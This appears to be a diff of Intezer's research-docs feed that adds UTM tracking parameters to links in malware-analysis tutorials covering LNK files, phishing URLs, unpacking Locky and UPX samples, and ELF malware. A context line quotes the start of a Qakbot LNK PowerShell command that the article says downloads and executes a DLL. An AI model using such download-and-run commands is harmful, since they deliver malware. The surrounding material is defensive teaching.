@@ -635,7 +635,7 @@ data, possibly a script. We noticed that files bigger than 4 KB should be
 considered suspicious files.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;For example, below is the content of
-&lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/files/a1e2a9bc32a2ff8392cc70586e34fb9ba86c5aaad3dffee0d4940a8adf742b13?utm_campaign=research-docs&amp;amp;utm_content=lnk&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;an LNK file used by Qakbot&lt;/a&gt;.
 It downloads a DLL from a remote location and executes it.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;pre&gt;&lt;code&gt;&amp;#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit iwr -Uri
@@ -674,10 +674,10 @@ In this blog, we covered the sections of the file format that can reveal
 suspicious indicators, then we presented real-life examples and presented an
 open-sourced tool that can be used to inspect LNK files.&lt;/p&gt;</description></item><item><title>A Beginner's Guide to Phishing URLs</title><link>https://research.intezer.com/docs/url-analysis/part1/</link><pubDate>Tue, 22 Feb 2022 00:00:00 +0000</pubDate><guid>https://research.intezer.com/docs/url-analysis/part1/</guid><description>
 &lt;p&gt;&lt;strong&gt;October 2023 Update:&lt;/strong&gt; &lt;em&gt;Intezer analyzes all URLs that we collect as evidence
-for &lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;automated alert triage&lt;/a&gt;, which now includes
-&lt;a href="https://intezer.com/reported-phishing/"target="_blank" rel="noopener"&gt;detecting and extracting QR codes for phishing email investigations.&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+for &lt;a href="https://intezer.com/pricing/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;automated alert triage&lt;/a&gt;, which now includes
+&lt;a href="https://intezer.com/reported-phishing/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;detecting and extracting QR codes for phishing email investigations.&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;At Intezer, we recently launched a URL analysis feature that will allow
-&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/"target="_blank" rel="noopener"&gt;detecting phishing or malicious URLs.&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://intezer.com/blog/product-updates/automatically-scan-urls-and-analyze-malware/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;detecting phishing or malicious URLs.&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;To do so, we have multiple integrations with services such as URLscan and
 APIVoid, and additionally, we are adding in-house built tools and an update to
 public API so you can integrate Intezer into your organizations&amp;rsquo; phishing
@@ -849,7 +849,7 @@ that would raise the probability of the URL being connected to phishing.
 URL of the exercise, &lt;code&gt;http://securitycenter.microsoft.us.admin-mcas-gov.ms&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/url-analysis/part1/images/fig2.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;URL Analysis -
-&lt;a href="https://analyze.intezer.com/url/5a70c8a2-2a7a-4f37-bfec-f82fcceca855"target="_blank" rel="noopener"&gt;https://analyze.intezer.com/url/5a70c8a2-2a7a-4f37-bfec-f82fcceca855&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;a href="https://analyze.intezer.com/url/5a70c8a2-2a7a-4f37-bfec-f82fcceca855?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;https://analyze.intezer.com/url/5a70c8a2-2a7a-4f37-bfec-f82fcceca855&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;h2&gt;Hacking the Browser&lt;span class="hx:absolute hx:-mt-20" id="hacking-the-browser"&gt;&lt;/span&gt;
 &lt;a href="#hacking-the-browser" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Next I would like to discuss a slightly different kind of manipulation, which
 is based on browser behavior. I put these in a different section because they
@@ -896,7 +896,7 @@ fashion:
 They way you get redirected to a page of the url service which shows you the
 intended URL.&lt;/li&gt;
 &lt;li&gt;Use a service like
-&lt;a href="https://analyze.intezer.com/?tab=url"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; to scan the URL and
+&lt;a href="https://analyze.intezer.com/?tab=url&amp;amp;utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; to scan the URL and
 get an analysis that tells you both what page the URL is redirecting to and
 if it is malicious.&lt;/li&gt;
 &lt;li&gt;Use an &amp;ldquo;un-shorten&amp;rdquo; URL service like
@@ -929,7 +929,7 @@ in order to remediate threats and study different malware families.&lt;/p&gt;
 &lt;a href="#when-will-you-reverse-engineer-malware" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;RE can be very time-consuming. When researching a malware, you will usually not
 start reversing it right away. Instead, you should conduct triage malware
 analysis by running the malware
-&lt;a href="https://intezer.com/blog/malware-analysis/the-state-of-malware-analysis/"target="_blank" rel="noopener"&gt;in a sandbox&lt;/a&gt;,
+&lt;a href="https://intezer.com/blog/malware-analysis/the-state-of-malware-analysis/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;in a sandbox&lt;/a&gt;,
 extracting strings, and more. This initial malware analysis phase can provide
 further context for reverse engineering, if needed. For instance, you can
 search for specific strings in the disassembler or expect to see a certain
@@ -1247,7 +1247,7 @@ accessible. This multi-part series will provide you with practical knowledge
 and tools for effective ELF malware analysis. You will gain a better
 understanding of the ELF format and learn how to analyze ELF files using static
 and dynamic methods. Also, we will present useful analysis tools and practice
-&lt;a href="https://intezer.com/intezer-analyze/"target="_blank" rel="noopener"&gt;malware analysis&lt;/a&gt; hands on. After this
+&lt;a href="https://intezer.com/intezer-analyze/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;malware analysis&lt;/a&gt; hands on. After this
 series you will be able to analyze an ELF file, determine if it&amp;rsquo;s malicious,
 and classify the threat.&lt;/p&gt;
 &lt;p&gt;Before diving into technical ELF analysis practices, this post will serve as an
@@ -1296,7 +1296,7 @@ RAT targeting Linux servers. It&amp;rsquo;s composed of a rootkit, a trojan, and
 initial deployment script. At the time of discovery by our researchers, the
 malware was undetected despite using code from various open-source projects
 such as Mirai and the Azazel rootkit. There is evidence that
-&lt;a href="https://intezer.com/blog/malware-analysis/hiddenwasp-emergence-of-linux-threats/"target="_blank" rel="noopener"&gt;HiddenWasp&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/malware-analysis/hiddenwasp-emergence-of-linux-threats/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;HiddenWasp&lt;/a&gt;
 is related to a Chinese APT.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
@@ -1415,12 +1415,12 @@ by security vendors, but also common ones. Mirai is a prime example. Mirai is a
 DDoS botnet whose source code was released to the wild and many botnets
 variants are now based on this code. All that was required for an attacker to
 bypass detection using this particular
-&lt;a href="https://analyze.intezer.com/#/files/1fc49503c92bce012cc9210a0490fb3657ff9177d342ce61a86dbabd530b7a15"target="_blank" rel="noopener"&gt;Mirai sample&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com#/files/1fc49503c92bce012cc9210a0490fb3657ff9177d342ce61a86dbabd530b7a15"target="_blank" rel="noopener"&gt;Mirai sample&lt;/a&gt;
 was to make a few signature changes by obfuscating the file&amp;rsquo;s strings.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/elf-malware/part1/images/fig1.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;This sample was uploaded to VirusTotal in March and had zero detections. Since
 then, we&amp;rsquo;ve published a blog post which discusses the
-&lt;a href="https://intezer.com/blog/linux/evasion-techniques-dissected-mirai-case-study/"target="_blank" rel="noopener"&gt;effectiveness of code reuse analysis vs. signature-based detection for detecting this malware&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/linux/evasion-techniques-dissected-mirai-case-study/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;effectiveness of code reuse analysis vs. signature-based detection for detecting this malware&lt;/a&gt;
 and other Linux threats. To this day, the file&amp;rsquo;s VirusTotal report lists only
 &lt;a href="https://www.virustotal.com/gui/file/1fc49503c92bce012cc9210a0490fb3657ff9177d342ce61a86dbabd530b7a15/detection"target="_blank" rel="noopener"&gt;one detection&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;When it comes to investigating ELF malware, the current antivirus solutions are
@@ -1473,7 +1473,7 @@ useful tools.&lt;/p&gt;
 &lt;p&gt;This marks the first of several blog posts that will focus on Executable and
 Linkable Format (ELF) files. In this series, we&amp;rsquo;ll introduce various topics,
 ranging from the basics of ELF files built upon Linux
-&lt;a href="https://intezer.com/blog/malware-analysis/analyzing-capabilities-in-PE-and-ELF-files/"target="_blank" rel="noopener"&gt;malware technologies&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/malware-analysis/analyzing-capabilities-in-PE-and-ELF-files/?utm_campaign=research-docs&amp;amp;utm_content=part1&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;malware technologies&lt;/a&gt;
 such as infection vectors, custom packer techniques and common malware
 practices like dynamic API resolving techniques or ELF header crafting.&lt;/p&gt;
 &lt;p&gt;The overall goal of the series is to help both advanced and beginner Linux
@@ -2002,11 +2002,11 @@ individual files for when you need to dig deep. Then we&amp;rsquo;ll look at aut
 analysis of &lt;em&gt;every incoming file&lt;/em&gt; from your alert sources with Intezer, like
 you&amp;rsquo;d want to do for triaging alerts.&lt;/p&gt;
 &lt;p&gt;Intezer&amp;rsquo;s
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;powerful malware analysis engine&lt;/a&gt; can
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;powerful malware analysis engine&lt;/a&gt; can
 help you speed up the process of classifying and analyzing files. To get
 started, upload &lt;strong&gt;any&lt;/strong&gt; type of Microsoft Office document to Intezer like you
 would with
-&lt;a href="https://intezer.com/blog/alert-triage/the-evolution-of-sandboxing/"target="_blank" rel="noopener"&gt;a traditional sandbox&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/the-evolution-of-sandboxing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;a traditional sandbox&lt;/a&gt;.
 The analysis will provide you with a trusted or malicious verdict. If the file
 is malicious, Intezer will also tell you what malware family it belongs to. The
 information provided in the analysis report gives investigators an immediate
@@ -2045,7 +2045,7 @@ further investigation of the compromised endpoint and to hunt for similar
 threats.&lt;/p&gt;
 &lt;p&gt;This can save you time if you have a single file that you need to investigate,
 but if you have a lot of files to analyze every day
-(&lt;a href="https://intezer.com/reported-phishing/"target="_blank" rel="noopener"&gt;like attachments from reported phishing emails&lt;/a&gt;)
+(&lt;a href="https://intezer.com/reported-phishing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;like attachments from reported phishing emails&lt;/a&gt;)
 then you&amp;rsquo;ll need something that can ingest and analyze a large volume of
 incoming files.&lt;/p&gt;
 &lt;h2&gt;Automating triage and analysis of Microsoft Office files&lt;span class="hx:absolute hx:-mt-20" id="automating-triage-and-analysis-of-microsoft-office-files"&gt;&lt;/span&gt;
@@ -2056,9 +2056,9 @@ files to analyze manually in a sandbox.&lt;/p&gt;
 &lt;p&gt;Intezer&amp;rsquo;s alert triage processes are built to &lt;strong&gt;automate tasks such as
 collecting and analyzing evidence like Office files from your alerts.&lt;/strong&gt; Intezer
 can also
-&lt;a href="https://intezer.com/blog/alert-triage/automated-endpoint-scanning-advanced-triage/"target="_blank" rel="noopener"&gt;analyze fileless threats&lt;/a&gt;
+&lt;a href="https://intezer.com/blog/alert-triage/automated-endpoint-scanning-advanced-triage/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;analyze fileless threats&lt;/a&gt;
 or
-&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/"target="_blank" rel="noopener"&gt;macros and scripts like PowerShell or Javascript&lt;/a&gt;,
+&lt;a href="https://intezer.com/blog/alert-triage/ai-insights-revolutionizing-threat-analysis/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;macros and scripts like PowerShell or Javascript&lt;/a&gt;,
 automatically giving you deeper insights about what an attacker was attempting
 to do next.&lt;/p&gt;
 &lt;p&gt;Here&amp;rsquo;s a look at how Intezer&amp;rsquo;s analysis and triage process works:&lt;/p&gt;
@@ -2068,10 +2068,10 @@ to do next.&lt;/p&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;If you&amp;rsquo;re already using a SOAR tool to collect alerts, Intezer can also provide
 your team with higher-quality analysis results while
-&lt;a href="https://intezer.com/blog/alert-triage/leveraging-intezers-smart-decision-making-in-your-soar/"target="_blank" rel="noopener"&gt;simplifying your SOAR playbooks for alert triage&lt;/a&gt;.
+&lt;a href="https://intezer.com/blog/alert-triage/leveraging-intezers-smart-decision-making-in-your-soar/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;simplifying your SOAR playbooks for alert triage&lt;/a&gt;.
 Ultimately, responding quickly to serious incidents requires an advanced
 platform designed to
-&lt;a href="https://intezer.com/pricing/"target="_blank" rel="noopener"&gt;automatically collect evidence, investigate, triage alerts, and escalate only the confirmed threats.&lt;/a&gt;&lt;/p&gt;
+&lt;a href="https://intezer.com/pricing/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;automatically collect evidence, investigate, triage alerts, and escalate only the confirmed threats.&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;As we looked at in this blog, Microsoft Office files are frequently used by
 attackers to deliver malware to endpoints. Attackers leverage both the
 different file formats and vulnerabilities in Office products to launch
@@ -2082,9 +2082,9 @@ lengthy.&lt;/p&gt;
 individual Office files, but in more advanced cases the process can be
 especially time-consuming. To speed up the investigation and classification of
 Office files, you can
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;upload specific files to Intezer&lt;/a&gt; to
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;upload specific files to Intezer&lt;/a&gt; to
 instantly get a full analysis report or
-&lt;a href="https://intezer.com/forensic-ai-soc/"target="_blank" rel="noopener"&gt;connect your alert sources to automatically analyze files&lt;/a&gt;
+&lt;a href="https://intezer.com/forensic-ai-soc/?utm_campaign=research-docs&amp;amp;utm_content=office&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;connect your alert sources to automatically analyze files&lt;/a&gt;
 and triage all your alerts.&lt;/p&gt;
 &lt;div class="footnotes" role="doc-endnotes"&gt;
 &lt;hr&gt;
@@ -2227,7 +2227,7 @@ However, malware developers can add &amp;ldquo;dummy&amp;rdquo; imports to misle
 &lt;h3&gt;Reverse Engineering Example: Static Unpacking of UPX Packed Samples&lt;span class="hx:absolute hx:-mt-20" id="reverse-engineering-example-static-unpacking-of-upx-packed-samples"&gt;&lt;/span&gt;
 &lt;a href="#reverse-engineering-example-static-unpacking-of-upx-packed-samples" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Standard UPX packed samples can be identified by the section names, as long as
 they were not modified by the attackers. Let&amp;rsquo;s take a look at a
-&lt;a href="https://analyze.intezer.com/files/02dda0916789c0c3572cbbf0e119cbae7be42e10eca39be66bbaaf2468a62b7a"target="_blank" rel="noopener"&gt;sample&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/02dda0916789c0c3572cbbf0e119cbae7be42e10eca39be66bbaaf2468a62b7a?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;sample&lt;/a&gt;
 with MD5 &lt;code&gt;5598febfbf00839c9f7047d9fe3205e3&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;The section names of the files contain the UPX string, as seen in the
 screenshot below:&lt;/p&gt;
@@ -2248,7 +2248,7 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;/div&gt;
 &lt;p&gt;You can run the command on the sample and verify that the extracted
-&lt;a href="https://analyze.intezer.com/files/4e509d450fde2008bc6c90986594d8374ac7a9dec637262fd1cb6fbd61f13fac"target="_blank" rel="noopener"&gt;file&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/4e509d450fde2008bc6c90986594d8374ac7a9dec637262fd1cb6fbd61f13fac?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;file&lt;/a&gt;
 has MD5 &lt;code&gt;6d13f5d287fd735a9bbc261aafb49006&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/malware_re_101/part2/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;2. Dynamic detection&lt;span class="hx:absolute hx:-mt-20" id="2-dynamic-detection"&gt;&lt;/span&gt;
@@ -2315,7 +2315,7 @@ Windows executables, but that&amp;rsquo;s not covered in this blog.&lt;/p&gt;
 &lt;h3&gt;Reverse Engineering Example: Extracting Packed Locky Payload&lt;span class="hx:absolute hx:-mt-20" id="reverse-engineering-example-extracting-packed-locky-payload"&gt;&lt;/span&gt;
 &lt;a href="#reverse-engineering-example-extracting-packed-locky-payload" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In this section, we will present a guide on extracting packed malware from 2
 popular malware: CobaltStrike and
-&lt;a href="https://analyze.intezer.com/files/2a40da48c9dc3e20bc6e30c986306ceccbc2d8be55b355b7a73d95c1a54319a4"target="_blank" rel="noopener"&gt;Locky&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/files/2a40da48c9dc3e20bc6e30c986306ceccbc2d8be55b355b7a73d95c1a54319a4?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Locky&lt;/a&gt;.
 Make sure to run (and debug) the following examples in an isolated Windows
 virtual machine.&lt;/p&gt;
 &lt;p&gt;You can watch the video of the hands-on unpacking process of Cobalt Strike. The
@@ -2334,7 +2334,7 @@ memory genetic analysis, and parsing the Beacon configuration.&lt;/p&gt;
 &lt;li&gt;Command line commands: &lt;code&gt;file&lt;/code&gt;, &lt;code&gt;strings&lt;/code&gt;, &lt;code&gt;shasum&lt;/code&gt;&lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;In this example, we will inspect a packed sample of
-&lt;a href="https://analyze.intezer.com/files/2a40da48c9dc3e20bc6e30c986306ceccbc2d8be55b355b7a73d95c1a54319a4"target="_blank" rel="noopener"&gt;Locky ransomware&lt;/a&gt;.
+&lt;a href="https://analyze.intezer.com/files/2a40da48c9dc3e20bc6e30c986306ceccbc2d8be55b355b7a73d95c1a54319a4?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Locky ransomware&lt;/a&gt;.
 While Intezer automatically identifies that the file is packed and extracts the
 payload for us, we will show how you can &lt;em&gt;manually&lt;/em&gt; extract the payload here.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Static analysis&lt;/strong&gt;&lt;/p&gt;
@@ -2398,7 +2398,7 @@ to file.&amp;rdquo;&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/malware_re_101/part2/images/fig11.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;The MD5 of the extracted payload is &lt;code&gt;e96dad009437ca774035ffd73708bd3e&lt;/code&gt;. We can
 see in
-&lt;a href="https://analyze.intezer.com/files/761e39686f293694ebda3de5f4aca0faef72e45046093feae9cda442429e0932"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/761e39686f293694ebda3de5f4aca0faef72e45046093feae9cda442429e0932?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;
 that, indeed, it&amp;rsquo;s Locky ransomware malware. Mazal tov! You have successfully
 extracted the Locky payload.&lt;/p&gt;
 &lt;h2&gt;Automating Unpacking for Every File&lt;span class="hx:absolute hx:-mt-20" id="automating-unpacking-for-every-file"&gt;&lt;/span&gt;
@@ -2459,7 +2459,7 @@ elaborate on each of them later.&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;&lt;a href="http://ntinfo.biz/index.html"target="_blank" rel="noopener"&gt;Detect It Easy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://elfparser.com/"target="_blank" rel="noopener"&gt;ElfParser&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://analyze.intezer.com/"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://analyze.intezer.com/?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://itsfoss.com/install-linux-in-virtualbox/"target="_blank" rel="noopener"&gt;Linux VM&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://linux.die.net/man/1/objcopy"target="_blank" rel="noopener"&gt;objcopy&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://www.pyinstaller.org/"target="_blank" rel="noopener"&gt;Pyinstaller&lt;/a&gt;&lt;/li&gt;
@@ -2812,13 +2812,13 @@ data-copied-label="Copied!"
 &lt;/div&gt;
 &lt;p&gt;We can assume the file drops a payload from a remote C&amp;amp;C.&lt;/p&gt;
 &lt;h2&gt;String Reuse&lt;span class="hx:absolute hx:-mt-20" id="string-reuse"&gt;&lt;/span&gt;
-&lt;a href="#string-reuse" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href="https://analyze.intezer.com/"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; is a useful tool for string
+&lt;a href="#string-reuse" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href="https://analyze.intezer.com/?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; is a useful tool for string
 extraction. It reduces analysis efforts by divulging whether certain strings
 have been seen before in other files. In the case of an unknown malware,
 filtering the common strings can help us focus our efforts on the file&amp;rsquo;s unique
 strings.&lt;/p&gt;
 &lt;p&gt;For example: Lazarus&amp;rsquo;s
-&lt;a href="https://analyze.intezer.com/files/0a7e7f99dd778cef86050d4ff436f209bd894ebb63faeb16ec0a92876ab81094"target="_blank" rel="noopener"&gt;ManusCrypt&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/0a7e7f99dd778cef86050d4ff436f209bd894ebb63faeb16ec0a92876ab81094?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;ManusCrypt&lt;/a&gt;
 ELF version contains some of the same strings found in its PE version, which
 was previously reported by the U.S. government:&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/elf-malware/part2/images/fig11.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
@@ -2826,11 +2826,11 @@ was previously reported by the U.S. government:&lt;/p&gt;
 samples in Intezer Analyze:&lt;/p&gt;
 &lt;p&gt;&lt;img src="https://research.intezer.com/docs/elf-malware/part2/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h2&gt;Code Reuse&lt;span class="hx:absolute hx:-mt-20" id="code-reuse"&gt;&lt;/span&gt;
-&lt;a href="#code-reuse" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Examining code reuse in &lt;a href="https://analyze.intezer.com/"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; can be
+&lt;a href="#code-reuse" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Examining code reuse in &lt;a href="https://analyze.intezer.com/?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt; can be
 a great starting point for initial analysis. It can expedite analysis time by
 disclosing where certain code has been used before in other files.&lt;/p&gt;
 &lt;p&gt;For example: This
-&lt;a href="https://analyze.intezer.com/files/a8b069ef9d76cd42e873c6e8ded9db8c17d9d0ce234b5e7c9a126b4d514c6f72"target="_blank" rel="noopener"&gt;Rekoobe sample&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/a8b069ef9d76cd42e873c6e8ded9db8c17d9d0ce234b5e7c9a126b4d514c6f72?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Rekoobe sample&lt;/a&gt;
 had 0 detections in VirusTotal. Upon upload to Intezer Analyze we receive a
 clear verdict (malicious) and classification (Rekoobe) based on code reuse to
 previous samples.&lt;/p&gt;
@@ -2904,7 +2904,7 @@ most simple tricks in Custom UPX, it evades static parsers rather easily.&lt;/p&
 &lt;p&gt;Code reuse can also simplify packer detection. Check out this
 &lt;a href="https://github.com/intezer/ELF-Malware-Analysis-101/raw/master/Part-2-Initial-Analysis/Article-samples/modified_upx_sample"target="_blank" rel="noopener"&gt;modified UPX example&lt;/a&gt;.
 It contains no string signatures but if we open it in
-&lt;a href="https://analyze.intezer.com/files/3d1650fe601e705d4bb2c4d197eeb0fb56fba0479df98dbd159dcbd15ee12f7e"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;
+&lt;a href="https://analyze.intezer.com/files/3d1650fe601e705d4bb2c4d197eeb0fb56fba0479df98dbd159dcbd15ee12f7e?utm_campaign=research-docs&amp;amp;utm_content=part2&amp;amp;utm_medium=referral&amp;amp;utm_source=research.intezer.com"target="_blank" rel="noopener"&gt;Intezer Analyze&lt;/a&gt;
 it&amp;rsquo;s clear the file is packed with modified UPX.&lt;/p&gt;
 &lt;p&gt;Files packed with modified UPX will most likely not unpack with the &lt;code&gt;upx -d&lt;/code&gt;
 command. In this case, we should proceed to dynamic analysis.&lt;/p&gt;
@@ -2994,7 +2994,7 @@ ELF binary. Another way to detect Pynistaller binaries is via strings. The
 interpreter has unique strings such as &amp;ldquo;Error detected starting Python VM&amp;rdquo;.
 Take a look at this
 &lt;a href="https://github.com/intezer/ELF-Malware-Analysis-101/blob/master/Part-2-Initial-Analysis/YARA/interpretes.yar"target="_blank" rel="noopener"&gt;YARA rule&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://analyze.intezer.com/files/06ad6831768fb9d04b5cbecce9753bab3be487992936eb82a00d8f77fb4b11bf"target="_blank" rel="noopener"&gt;Code reuse&lt;/a&gt;
